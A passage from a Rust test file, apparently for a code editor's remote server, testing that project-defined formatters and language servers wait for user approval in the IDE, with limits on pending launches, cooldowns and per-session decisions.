        answer
            .reason
            .as_deref()
            .is_some_and(|reason| reason.contains("which this IDE does not know")),
        "{answer:?}"
    );

    for index in 0..32 {
        withdraw_from_the_ide(&session, index, cx).await;
    }
    cx.executor().advance_clock(Duration::from_secs(6));
    cx.run_until_parked();
    assert!(pending_launches(cx).is_empty());
    assert_eq!(
        notified_key_count(cx),
        32,
        "remembered for the cooldown, so that asking again brings nothing up again"
    );

    // Asking about ever new launches and withdrawing them raises no more
    // notifications than waiting would.
    for index in 40..80 {
        let answer = ask_the_ide(&session, formatter_question(worktree_id, index), cx).await;
        assert!(
            refused_as_too_many(&answer),
            "withdrawn launches still count for a while: {answer:?}"
        );
        withdraw_from_the_ide(&session, index, cx).await;
    }
    assert!(pending_launches(cx).is_empty());

    // A launch asked about again, however often its definition changed in
    // between, was only restarted: it keeps the room it had.
    for index in 100..140 {
        let answer = ask_the_ide(
            &session,
            launch_question(
                worktree_id,
                index,
                proto::ProjectLaunchKind::LaunchKindExternalFormatter,
                "fmt-5",
            ),
            cx,
        )
        .await;
        assert_eq!(answer.state, pending, "{answer:?}");
        withdraw_from_the_ide(&session, index, cx).await;
    }
    let answer = ask_the_ide(&session, formatter_question(worktree_id, 80), cx).await;
    assert!(refused_as_too_many(&answer), "{answer:?}");

    cx.executor().advance_clock(Duration::from_secs(6));
    cx.run_until_parked();
    cx.executor().advance_clock(Duration::from_secs(11 * 60));
    let answer = ask_the_ide(&session, formatter_question(worktree_id, 81), cx).await;
    assert_eq!(answer.state, pending, "{answer:?}");
    assert_eq!(
        notified_key_count(cx),
        1,
        "the others are forgotten with their cooldown"
    );
}

// Approved launches are never forgotten, so that a later revocation still
// reaches the remote server: with nothing else to make room, a new question
// is refused instead.
#[gpui::test]
async fn test_approved_launches_are_never_forgotten(
    cx: &mut TestAppContext,
    server_cx: &mut TestAppContext,
) {
    cx.update(ProjectLaunchApprovals::approve_everything_for_tests);
    let (_project, worktree_id, session) = questioned_project(cx, server_cx).await;
    let approved = proto::ProjectLaunchApprovalState::LaunchApprovalApproved as i32;

    for index in 0..256 {
        let answer = ask_the_ide(&session, formatter_question(worktree_id, index), cx).await;
        assert_eq!(answer.state, approved, "{answer:?}");
    }
    let answer = ask_the_ide(&session, formatter_question(worktree_id, 256), cx).await;
    assert_eq!(
        answer.state,
        proto::ProjectLaunchApprovalState::LaunchApprovalUnavailable as i32,
        "{answer:?}"
    );
    assert!(
        answer
            .reason
            .as_deref()
            .is_some_and(|reason| reason.contains("Too many approved launches")),
        "{answer:?}"
    );
    let answer = ask_the_ide(&session, formatter_question(worktree_id, 0), cx).await;
    assert_eq!(
        answer.state, approved,
        "a launch it knows is still answered: {answer:?}"
    );
}

// A save that gave up on a stalled IDE does not stop language servers from
// asking: one that starts meanwhile waits for the IDE, says why once its own
// wait runs out, stops saying so when the IDE answers, and starts once
// approved, with no restart.
#[gpui::test]
async fn test_a_stalled_ide_holds_language_servers_until_it_answers(
    cx: &mut TestAppContext,
    server_cx: &mut TestAppContext,
) {
    let mut settings = formatter_settings();
    settings["languages"] = json!({ "Rust": { "language_servers": [PROJECT_SERVER] } });
    settings["lsp"] = json!({ "project_lsp": { "binary": { "path": "project-lsp-binary" } } });
    let fs = remote_tree(settings.to_string(), server_cx).await;
    let (client, headless) = session_without_launch_approvals(&fs, cx, server_cx).await;
    let languages = host_languages(&headless, server_cx);
    let mut fake_servers = register_fake_server_on_host(&languages, PROJECT_SERVER);
    let (mut binary_statuses, _binary_status_subscription) =
        languages.language_server_binary_statuses();
    let session = client.read_with(cx, |client, _| client.proto_client());
    let (end_stall, stall_ended) = futures::channel::oneshot::channel::<()>();
    let stall_ended = futures::FutureExt::shared(stall_ended);
    let questions = Arc::new(AtomicUsize::new(0));
    let language_server_keys = Arc::new(std::sync::Mutex::new(Vec::new()));
    session.add_request_handler(client.downgrade(), {
        let questions = questions.clone();
        let language_server_keys = language_server_keys.clone();
        move |_, envelope: TypedEnvelope<proto::RequestProjectLaunchApproval>, _| {
            questions.fetch_add(1, Ordering::SeqCst);
            if envelope.payload.kind
                == proto::ProjectLaunchKind::LaunchKindLanguageServerBinary as i32
            {
                language_server_keys
                    .lock()
                    .unwrap()
                    .push(envelope.payload.remote_key);
            }
            let stall_ended = stall_ended.clone();
            async move {
                stall_ended.await?;
                anyhow::Ok(proto::RequestProjectLaunchApprovalResponse {
                    state: proto::ProjectLaunchApprovalState::LaunchApprovalPending as i32,
                    reason: None,
                })
            }
        }
    });
    let buffer_id = open_buffer_over_session(&session, cx).await;

    let format = cx
        .executor()
        .spawn(session.request(format_request(buffer_id)));
    cx.run_until_parked();
    cx.executor().advance_clock(Duration::from_secs(6));
    cx.run_until_parked();
    assert!(format.await.is_ok(), "the save gave up on the IDE");

    let registered = session.request(proto::RegisterBufferWithLanguageServers {
        project_id: proto::REMOTE_SERVER_PROJECT_ID,
        buffer_id,
        only_servers: Vec::new(),
    });
    cx.run_until_parked();
    registered.await.unwrap();
    // The server starts a few steps after the registration is acknowledged.
    cx.run_until_parked();
    assert_eq!(
        questions.load(Ordering::SeqCst),
        2,
        "the language server still asks the IDE"
    );

    cx.executor().advance_clock(Duration::from_secs(31));
    cx.run_until_parked();
    let failure =
        last_failure(&mut binary_statuses, PROJECT_SERVER).expect("the server says why it waits");
    assert!(
        failure.contains("It starts once the IDE responds"),
        "{failure}"
    );
    assert!(fake_servers.try_recv().is_err());

    end_stall.send(()).unwrap();
    cx.run_until_parked();
    assert!(
        fake_servers.try_recv().is_err(),
        "the IDE answered that the launch waits for the user"
    );
    assert_eq!(
        last_status(&mut binary_statuses, PROJECT_SERVER),
        Some(BinaryStatus::None),
        "the status no longer says that the server waits for the IDE"
    );

    let remote_key = language_server_keys
        .lock()
        .unwrap()
        .last()
        .cloned()
        .expect("the language server asked");
    session
        .request(proto::ProjectLaunchApprovalDecided {
            project_id: proto::REMOTE_SERVER_PROJECT_ID,
            remote_key,
            approved: true,
        })
        .await
        .unwrap();
    cx.run_until_parked();
    fake_servers
        .next()
        .await
        .expect("the language server starts once the user approves it");
}

// Rewriting a server's definition over and over, with a restart each time,
// keeps one launch waiting at the IDE: the latest definition can still be
// approved, and starts.
#[gpui::test]
async fn test_a_definition_rewritten_over_and_over_can_still_be_approved(
    cx: &mut TestAppContext,
    server_cx: &mut TestAppContext,
) {
    let (fs, project, headless) = remote_project_with_language_server(
        json!({ "path": "project-lsp-binary-0" }),
        cx,
        server_cx,
    )
    .await;
    let mut fake_servers =
        register_fake_server_on_host(&host_languages(&headless, server_cx), PROJECT_SERVER);
    let (buffer, _handle) = open_with_language_servers(&project, path!("/code/project1"), cx).await;
    assert_eq!(pending_launches(cx).len(), 1);

    for cycle in 1..=40 {
        fs.insert_file(
            path!("/code/project1/.zed/settings.json"),
            project_server_settings(json!({ "path": format!("project-lsp-binary-{cycle}") }))
                .into_bytes(),
        )
        .await;
        cx.run_until_parked();
        project.update(cx, |project, cx| {
            project.restart_language_servers_for_buffers(
                vec![buffer.clone()],
                HashSet::default(),
                true,
                cx,
            )
        });
        cx.run_until_parked();
        // A server that is still starting gets a few seconds before it is
        // dropped.
        cx.executor().advance_clock(Duration::from_secs(6));
        cx.run_until_parked();
    }
    assert!(fake_servers.try_recv().is_err());

    let pending = pending_launches(cx);
    assert_eq!(pending.len(), 1, "{pending:?}");
    assert_eq!(
        pending[0].target.display().to_string(),
        "project-lsp-binary-40"
    );
    let approvals = cx.update(ProjectLaunchApprovals::global);
    approvals
        .update(cx, |approvals, cx| {
            approvals.approve_pending(&pending[0].key, cx)
        })
        .await
        .expect("the approval is stored");
    cx.run_until_parked();
    fake_servers
        .next()
        .await
        .expect("the latest definition starts once approved");
    cx.run_until_parked();
    assert!(runs_language_server(&headless, PROJECT_SERVER, server_cx));
}

// A language server the IDE has no room for waits for room instead of
// giving up, says why meanwhile, and is asked about once the IDE decides
// something.
#[gpui::test]
async fn test_a_language_server_waits_for_room_at_the_ide(
    cx: &mut TestAppContext,
    server_cx: &mut TestAppContext,
) {
    let (_fs, project, headless) =
        remote_project_with_language_server(json!({ "path": "project-lsp-binary" }), cx, server_cx)
            .await;
    let languages = host_languages(&headless, server_cx);
    let mut fake_servers = register_fake_server_on_host(&languages, PROJECT_SERVER);
    let (mut binary_statuses, _binary_status_subscription) =
        languages.language_server_binary_statuses();
    let worktree_id = project
        .update(cx, |project, cx| {
            project.find_or_create_worktree(path!("/code/project1"), true, cx)
        })
        .await
        .unwrap()
        .0
        .read_with(cx, |worktree, _| worktree.id().to_proto());
    cx.run_until_parked();
    let session = server_cx.read(|cx| headless.read(cx).session.clone());
    for index in 0..32 {
        let answer = ask_the_ide(&session, formatter_question(worktree_id, index), cx).await;
        assert_eq!(
            answer.state,
            proto::ProjectLaunchApprovalState::LaunchApprovalPending as i32,
            "{answer:?}"
        );
    }

    let (_buffer, _handle) =
        open_with_language_servers(&project, path!("/code/project1"), cx).await;
    let failure =
        last_failure(&mut binary_statuses, PROJECT_SERVER).expect("the server says why it waits");
    assert!(
        failure.contains("It is asked for once fewer are waiting"),
        "{failure}"
    );
    assert_eq!(pending_launches(cx).len(), 32);
    cx.executor().advance_clock(Duration::from_secs(61));
    cx.run_until_parked();
    assert_eq!(pending_launches(cx).len(), 32, "still no room");

    let formatter = pending_launches(cx)
        .into_iter()
        .find(|launch| launch.kind == LaunchKind::ExternalFormatter)
        .expect("a formatter waits");
    let approvals = cx.update(ProjectLaunchApprovals::global);
    approvals
        .update(cx, |approvals, cx| {
            approvals.deny_pending(&formatter.key, cx)
        })
        .await
        .expect("the denial is stored");
    cx.run_until_parked();
    let server = pending_launches(cx)
        .into_iter()
        .find(|launch| launch.kind == LaunchKind::LanguageServerBinary)
        .expect("the language server is asked about once there is room");
    assert_eq!(
        last_status(&mut binary_statuses, PROJECT_SERVER),
        Some(BinaryStatus::None),
        "the status no longer says that the server waits for room"
    );
    approvals
        .update(cx, |approvals, cx| {
            approvals.approve_pending(&server.key, cx)
        })
        .await
        .expect("the approval is stored");
    cx.run_until_parked();
    fake_servers
        .next()
        .await
        .expect("the language server starts once approved");
}

// While a question the IDE let go unanswered is still out, a restarted
// language server waits for that answer instead of asking again, until a
// new connection comes.
#[gpui::test]
async fn test_restarts_do_not_pile_up_questions_at_a_silent_ide(
    cx: &mut TestAppContext,
    server_cx: &mut TestAppContext,
) {
    let fs = remote_tree(
        project_server_settings(json!({ "path": "project-lsp-binary" })),
        server_cx,
    )
    .await;
    let (client, headless) = session_without_launch_approvals(&fs, cx, server_cx).await;
    let mut fake_servers =
        register_fake_server_on_host(&host_languages(&headless, server_cx), PROJECT_SERVER);
    let session = client.read_with(cx, |client, _| client.proto_client());
    let questions = Arc::new(AtomicUsize::new(0));
    session.add_request_handler(client.downgrade(), {
        let questions = questions.clone();
        move |_, _: TypedEnvelope<proto::RequestProjectLaunchApproval>, _| {
            questions.fetch_add(1, Ordering::SeqCst);
            futures::future::pending::<anyhow::Result<proto::RequestProjectLaunchApprovalResponse>>(
            )
        }
    });
    let buffer_id = open_buffer_over_session(&session, cx).await;
    let registered = session.request(proto::RegisterBufferWithLanguageServers {
        project_id: proto::REMOTE_SERVER_PROJECT_ID,
        buffer_id,
        only_servers: Vec::new(),
    });
    cx.run_until_parked();
    registered.await.unwrap();
    cx.run_until_parked();
    assert_eq!(questions.load(Ordering::SeqCst), 1);
    cx.executor().advance_clock(Duration::from_secs(31));
    cx.run_until_parked();

    for _ in 0..5 {
        let restarted = session.request(proto::RestartLanguageServers {
            project_id: proto::REMOTE_SERVER_PROJECT_ID,
            buffer_ids: vec![buffer_id],
            only_servers: Vec::new(),
            all: false,
        });
        cx.run_until_parked();
        restarted.await.unwrap();
        cx.executor().advance_clock(Duration::from_secs(31));
        cx.run_until_parked();
    }
    assert_eq!(
        questions.load(Ordering::SeqCst),
        1,
        "one question at a time is out for the launch"
    );
    assert!(fake_servers.try_recv().is_err());

    // A new connection may bring an IDE that answers.
    headless.update(server_cx, |headless, cx| headless.connection_restored(cx));
    cx.run_until_parked();
    assert_eq!(
        questions.load(Ordering::SeqCst),
        2,
        "asked again on the new connection"
    );
}

// Two projects on one host are two sessions of one process (ADR-F45); a
// decision reaches the session that asked, not the other one.
#[gpui::test]
async fn test_each_session_hears_only_its_own_decisions(
    cx: &mut TestAppContext,
    server_cx: &mut TestAppContext,
) {
    let fs = FakeFs::new(server_cx.executor());
    let settings = project_server_settings(json!({ "path": "project-lsp-binary" }));
    fs.insert_tree(
        path!("/code"),
        json!({
            "project1": { ".zed": { "settings.json": settings.clone() }, "src": { "lib.rs": "fn one() {}" } },
            "project2": { ".zed": { "settings.json": settings }, "src": { "lib.rs": "fn two() {}" } },
        }),
    )
    .await;
    cx.update(|cx| {
        release_channel::init(semver::Version::new(0, 0, 0), cx);
        cx.set_global(db::AppDatabase::test_new());
    });
    server_cx.update(|cx| release_channel::init(semver::Version::new(0, 0, 0), cx));
    init_logger();
    server_cx.update(HeadlessProject::init);
    let languages = Arc::new(LanguageRegistry::new(server_cx.executor()));
    let host = server_cx.new(|cx| {
        crate::HeadlessHost::new(
            crate::HeadlessHostState {
                fs: fs.clone(),
                http_client: Arc::new(BlockedHttpClient),
                node_runtime: NodeRuntime::unavailable(),
                languages: languages.clone(),
                extension_host_proxy: Arc::new(ExtensionHostProxy::new()),
                startup_time: std::time::Instant::now(),
            },
            cx,
        )
    });
    let mut fake_servers = register_fake_server_on_host(&languages, PROJECT_SERVER);

    let mut sessions = Vec::new();
    for worktree_path in [path!("/code/project1"), path!("/code/project2")] {
        let (opts, session, _) = RemoteClient::fake_server(cx, server_cx);
        let headless =
            server_cx.new(|cx| HeadlessProject::new_in_host(host.clone(), session, false, cx));
        let ssh = RemoteClient::connect_mock(opts, cx).await;
        let project = if sessions.is_empty() {
            build_project(ssh, cx)
        } else {
            let client = fake_client(cx);
            connect_project(ssh, client, cx)
        };
        register_rust_on_client(&project, &[PROJECT_SERVER], cx);
        let opened = open_with_language_servers(&project, worktree_path, cx).await;
        sessions.push((project, headless, opened));
    }
    assert!(fake_servers.try_recv().is_err());

    let pending = pending_launches(cx);
    assert_eq!(
        pending.len(),
        2,
        "each session asks about its own worktree: {pending:?}"
    );
    let launch_in = |worktree_path: &str| {
        pending
            .iter()
            .find(|launch| &*launch.worktree_abs_path == Path::new(worktree_path))
            .cloned()
            .expect("a pending launch for the worktree")
    };
    let first = launch_in(path!("/code/project1"));
    let second = launch_in(path!("/code/project2"));

    let approvals = cx.update(ProjectLaunchApprovals::global);
    approvals
        .update(cx, |approvals, cx| {
            approvals.approve_pending(&first.key, cx)
        })
        .await
        .expect("the approval is stored");
    cx.run_until_parked();
    fake_servers
        .next()
        .await
        .expect("the session that asked starts its server");
    cx.run_until_parked();
    assert!(runs_language_server(
        &sessions[0].1,
        PROJECT_SERVER,
        server_cx
    ));
    assert!(
        !runs_language_server(&sessions[1].1, PROJECT_SERVER, server_cx),
        "the other session still waits for its own decision"
    );
    assert!(fake_servers.try_recv().is_err());
    assert_eq!(
        pending_launches(cx)
            .into_iter()
            .map(|launch| launch.key)
            .collect::<Vec<_>>(),
        vec![second.key.clone()]
    );

    approvals
        .update(cx, |approvals, cx| {
            approvals.approve_pending(&second.key, cx)
        })
        .await
        .expect("the approval is stored");
    cx.run_until_parked();
    fake_servers
        .next()
        .await
        .expect("the second session starts its server once approved");
    cx.run_until_parked();
    assert!(runs_language_server(
        &sessions[1].1,
        PROJECT_SERVER,
        server_cx
    ));
}

/// The documents `server` was sent didOpen for since the last call, with their
/// text as sent.
fn documents_opened_in(server: &mut lsp::FakeLanguageServer) -> HashSet<(lsp::Uri, String)> {
    let mut opened = HashSet::default();
    while let Some(Some(params)) = futures::FutureExt::now_or_never(
        server.try_receive_notification::<lsp::notification::DidOpenTextDocument>(),
    ) {
        // Windows sends the buffer's line endings.
        opened.insert((
            params.text_document.uri,
            params.text_document.text.replace("\r\n", "\n"),
        ));
    }
    opened
}

// The remote host reopens, in the restarted server, the buffers the client
// registered: it holds a handle for each of them on the client's behalf.
// Buffers the client only opened (a search result it never showed) are not.
#[gpui::test]
async fn test_remote_restart_reopens_the_buffers_the_client_registered(
    cx: &mut TestAppContext,
    server_cx: &mut TestAppContext,
) {
    cx.update(ProjectLaunchApprovals::approve_everything_for_tests);
    let fs = FakeFs::new(server_cx.executor());
    fs.insert_tree(
        path!("/code"),
        json!({
            "project1": {
                ".git": {},
                "src": {
                    "held.rs": "fn held() {}",
                    "scrolled_away.rs": "fn scrolled_away() {}",
                    "never_shown.rs": "fn never_shown() {}",
                }
            },
        }),
    )
    .await;
    let (project, headless) = init_test(&fs, cx, server_cx).await;
    register_rust_on_client(&project, &["rust-analyzer"], cx);
    let mut fake_servers = server_cx.update(|cx| {
        headless.read(cx).languages.register_fake_lsp_server(
            LanguageServerName("rust-analyzer".into()),
            lsp::ServerCapabilities::default(),
            None,
        )
    });
    cx.run_until_parked();
    let worktree_id = project
        .update(cx, |project, cx| {
            project.languages().add(rust_lang());
            project.find_or_create_worktree(path!("/code/project1"), true, cx)
        })
        .await
        .expect("adding the worktree")
        .0
        .read_with(cx, |worktree, _| worktree.id());
    cx.run_until_parked();

    let (held, _held_handle) = project
        .update(cx, |project, cx| {
            project.open_buffer_with_lsp((worktree_id, rel_path("src/held.rs")), cx)
        })
        .await
        .expect("opening held.rs");
    let (scrolled_away, scrolled_away_handle) = project
        .update(cx, |project, cx| {
            project.open_buffer_with_lsp((worktree_id, rel_path("src/scrolled_away.rs")), cx)
        })
        .await
        .expect("opening scrolled_away.rs");
    let never_shown = project
        .update(cx, |project, cx| {
            project.open_buffer((worktree_id, rel_path("src/never_shown.rs")), cx)
        })
        .await
        .expect("opening never_shown.rs");
    cx.run_until_parked();
    let mut first = fake_servers.next().await.expect("the server starts");
    cx.run_until_parked();
    server_cx.run_until_parked();
    let uri = |abs_path: &str| lsp::Uri::from_file_path(abs_path).expect("an absolute path");
    assert_eq!(
        documents_opened_in(&mut first),
        HashSet::from_iter([
            (
                uri(path!("/code/project1/src/held.rs")),
                "fn held() {}".to_string()
            ),
            (
                uri(path!("/code/project1/src/scrolled_away.rs")),
                "fn scrolled_away() {}".to_string()
            ),
        ])
    );

    held.update(cx, |buffer, cx| {
        buffer.edit([(0..0, "// unsaved\n")], None, cx)
    });
    // The client lets go of its handle, but the remote host keeps the one it
    // took for the client until the client closes the buffer.
    drop(scrolled_away_handle);
    cx.run_until_parked();
    // Clones: a buffer the client drops is closed on the remote host too.
    project.update(cx, |project, cx| {
        project.restart_language_servers_for_buffers(
            vec![never_shown.clone(), scrolled_away.clone(), held.clone()],
            HashSet::default(),
            true,
            cx,
        );
    });
    cx.run_until_parked();
    server_cx.run_until_parked();
    // Not awaited: with nothing reopened, no server would start to wait for.
    let mut second = futures::FutureExt::now_or_never(fake_servers.next())
        .flatten()
        .expect("the server restarts for the buffers the client registered");
    cx.run_until_parked();
    server_cx.run_until_parked();
    assert_eq!(
        documents_opened_in(&mut second),
        HashSet::from_iter([
            (
                uri(path!("/code/project1/src/held.rs")),
                "// unsaved\nfn held() {}".to_string()
            ),
            (
                uri(path!("/code/project1/src/scrolled_away.rs")),
                "fn scrolled_away() {}".to_string()
            ),
        ]),
        "the restarted server gets the client's unsaved text, and not the buffer the client never registered"
    );
}
